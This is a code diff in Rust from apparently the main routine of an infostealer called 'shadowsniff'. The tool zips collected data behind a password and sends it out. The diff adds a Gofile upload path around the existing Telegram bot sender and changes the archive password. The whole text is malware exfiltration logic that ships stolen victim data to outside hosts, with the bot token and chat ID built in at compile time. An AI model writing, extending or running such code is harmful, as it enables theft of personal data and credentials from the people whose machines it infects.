@@ -15,6 +15,7 @@ use filesystem::path::Path;
 use filesystem::virtualfs::VirtualFileSystem;
 use filesystem::FileSystem;
 use ipinfo::init_ip_info;
+use sender::gofile::Gofile;
 use sender::telegram_bot::TelegramBot;
 use sender::{LogFile, LogSender};
 use shadowsniff::SniffTask;
@@ -49,7 +50,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
 
     log_debug!("{displayed_collector}");
 
-    let password = "shadowsniff-output".to_string();
+    let password = "shadowsniff-ouasdjkasjdbvtput".to_string();
     let zip = ZipArchive::default()
         .add_folder_content(&fs, out)
         .password(&password)
@@ -59,7 +60,9 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
-    TelegramBot::new(Arc::from(env!("TELEGRAM_CHAT_ID")), Arc::from(env!("TELEGRAM_BOT_TOKEN")))
+    let telegram = TelegramBot::new(Arc::from(env!("TELEGRAM_CHAT_ID")), Arc::from(env!("TELEGRAM_BOT_TOKEN")));
+
+    Gofile::new(telegram)
         .send(LogFile::ZipArchive(zip), Some(password), &collector)
         .unwrap();
 
